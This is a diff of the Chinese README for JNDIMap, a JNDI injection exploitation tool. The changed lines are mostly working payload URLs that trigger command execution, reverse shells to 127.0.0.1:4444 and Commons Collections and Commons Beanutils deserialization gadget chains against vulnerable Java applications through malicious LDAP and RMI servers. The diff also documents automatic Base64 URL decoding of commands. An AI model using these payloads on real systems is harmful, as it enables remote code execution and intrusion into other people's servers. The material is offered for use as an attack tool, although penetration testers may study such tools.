@@ -6,7 +6,7 @@ JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI 和 LDAP 协议, 包含多
 
 目前支持以下功能
 
-- DnsLog
+- DNS Log
 - 命令执行
 - 原生反弹 Shell (支持 Windows)
 - 加载自定义 Class 字节码
@@ -51,6 +51,8 @@ Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpP
 
 注意传入的 Base64 均为 **Base64 URL 编码**, 即把 `+` 和 `/` 替换为 `-` 和 `_`
 
+所有能够执行命令的路由均支持自动 Base64 URL 解码, 即可以直接传入明文命令或 Base64 URL 编码后的命令
+
 以下路由除 `/Deserialize/*` (LDAP 反序列化) 以外, 均支持 RMI 和 LDAP 协议
 
 对于 RMI 协议, 只需要将 `ldap://127.0.0.1:1389/` 替换为 `rmi://127.0.0.1:1099/` 即可
@@ -63,11 +65,11 @@ Java 版本需小于 8u121 (RMI 协议) 或 8u191 (LDAP 协议)
 
 ```bash
 # 发起 DNS 请求
-ldap://127.0.0.1:1389/Basic/DnsLog/xxx.dnslog.cn
+ldap://127.0.0.1:1389/Basic/DNSLog/xxx.dnslog.cn
 
-# 命令执行
+# 命令执行 (支持自动 Base64 URL 解码)
 ldap://127.0.0.1:1389/Basic/Command/open -a Calculator
-ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
+ldap://127.0.0.1:1389/Basic/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 
 # 加载自定义 Class 字节码
 
@@ -324,7 +326,7 @@ ldap://127.0.0.1:1389/Deserialize/<base64-serialize-data>
 
 # CommonsCollectionsK1 反序列化 (3.1 + TemplatesImpl), 支持命令执行和反弹 Shell
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
+ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/ReverseShell/127.0.0.1/4444
 
 # CommonsCollectionsK2 反序列化 (4.0 + TemplatesImpl), 功能同上
@@ -332,7 +334,7 @@ ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK2/Command/open -a Calculato
 
 # CommonsCollectionsK3 反序列化 (3.1 + Runtime.exec), 仅支持命令执行
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
+ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 
 # CommonsCollectionsK4 反序列化 (4.0 + Runtime.exec), 功能同上
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator
@@ -343,12 +345,12 @@ ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculato
 
 # 1.8.3
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
+ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/ReverseShell/127.0.0.1/4444
 
 # 1.9.4
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
+ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/4444
 
 # Jackson 原生反序列化
